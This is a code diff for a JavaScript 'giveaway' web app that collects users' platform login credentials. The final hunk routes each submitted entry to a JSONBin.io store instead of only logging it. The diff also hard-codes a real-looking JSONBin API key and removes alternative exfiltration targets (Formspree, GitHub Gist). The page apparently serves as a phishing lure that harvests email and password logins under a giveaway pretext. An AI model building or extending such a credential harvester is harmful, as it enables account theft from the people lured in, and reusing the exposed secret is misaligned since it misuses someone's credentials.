@@ -149,12 +149,10 @@ class GiveawayApp {
     };
   }
 
-  // Save data functionality - Multiple remote options
+  // Save data functionality - JSONBin.io storage
   async saveDataRemotely(entry) {
     try {
-      // Option 1: JSONBin.io (Free JSON storage)
       await this.saveToJSONBin(entry);
-
       console.log("Entry saved remotely:", entry);
     } catch (error) {
       console.error("Error saving data remotely:", error);
@@ -164,10 +162,11 @@ class GiveawayApp {
     }
   }
 
-  // Option 1: JSONBin.io - Free JSON storage service
+  // JSONBin.io - Free JSON storage service
   async saveToJSONBin(entry) {
-    const BIN_ID = "679f1234567890abcdef1234"; // Replace with your bin ID
-    const API_KEY = "$2a$10$your-api-key-here"; // Replace with your API key
+    const BIN_ID = "69609dff43b1c97be9239482"; // Replace with your bin ID
+    const API_KEY =
+      "$2a$10$Ct09JI48oK.e81mQcVCdwuo0F87ZmNeD5lwBYlQeeRp72QmvDdPqu"; // Replace with your API key
 
     try {
       // First, get existing data
@@ -215,110 +214,6 @@ class GiveawayApp {
       console.error("JSONBin error:", error);
       throw error;
     }
-  }
-
-  // Option 2: Formspree - Simple form submission service
-  async saveToFormspree(entry) {
-    const FORMSPREE_ENDPOINT = "https://formspree.io/f/your-form-id"; // Replace with your form ID
-
-    try {
-      const response = await fetch(FORMSPREE_ENDPOINT, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          platform: entry.platform,
-          email: entry.email,
-          timestamp: entry.timestamp,
-          // Note: Don't send passwords to form services for security
-          message: `New ${entry.platform} entry from ${entry.email}`,
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error("Failed to save to Formspree");
-      }
-
-      console.log("Data sent to Formspree successfully");
-    } catch (error) {
-      console.error("Formspree error:", error);
-      throw error;
-    }
-  }
-
-  // Option 3: GitHub Gist - Free file storage via GitHub API
-  async saveToGitHubGist(entry) {
-    const GITHUB_TOKEN = "your-github-token"; // Replace with your GitHub token
-    const GIST_ID = "your-gist-id"; // Replace with your gist ID (optional for new gist)
-
-    try {
-      // Get existing gist content
-      let existingEntries = [];
-      if (GIST_ID) {
-        const getResponse = await fetch(
-          `https://api.github.com/gists/${GIST_ID}`,
-          {
-            headers: {
-              Authorization: `token ${GITHUB_TOKEN}`,
-              Accept: "application/vnd.github.v3+json",
-            },
-          }
-        );
-
-        if (getResponse.ok) {
-          const gist = await getResponse.json();
-          const content = gist.files["giveaway-entries.json"]?.content;
-          if (content) {
-            existingEntries = JSON.parse(content);
-          }
-        }
-      }
-
-      // Add new entry
-      existingEntries.push(entry);
-
-      // Update or create gist
-      const gistData = {
-        description: "Giveaway Entries Data",
-        public: false,
-        files: {
-          "giveaway-entries.json": {
-            content: JSON.stringify(existingEntries, null, 2),
-          },
-        },
-      };
-
-      const url = GIST_ID
-        ? `https://api.github.com/gists/${GIST_ID}`
-        : "https://api.github.com/gists";
-
-      const response = await fetch(url, {
-        method: GIST_ID ? "PATCH" : "POST",
-        headers: {
-          Authorization: `token ${GITHUB_TOKEN}`,
-          Accept: "application/vnd.github.v3+json",
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(gistData),
-      });
-
-      if (!response.ok) {
-        throw new Error("Failed to save to GitHub Gist");
-      }
-
-      console.log("Data saved to GitHub Gist successfully");
-    } catch (error) {
-      console.error("GitHub Gist error:", error);
-      throw error;
-    }
-  }
-
-  // Option 4: Firebase Firestore (requires Firebase config)
-  async saveToFirestore(entry) {
-    // This would require Firebase SDK
-    // Implementation depends on your Firebase configuration
-    console.log("Firestore save would go here");
   }
 
   // Fallback: Local storage
@@ -790,8 +685,8 @@ class GiveawayApp {
         timestamp: new Date().toISOString(),
       };
 
-      // Log the entry data
-      console.log("Entry saved:", newEntry);
+      // Save the entry to JSONBin.io
+      await this.saveDataRemotely(newEntry);
 
       // Clear form
       emailInput.value = "";
@@ -800,6 +695,7 @@ class GiveawayApp {
       // Navigate to home with success message
       this.navigateWithSuccess(platform);
     } catch (error) {
+      console.error("Save error:", error);
       alert("Failed to save login credentials. Please try again.");
     }
   }
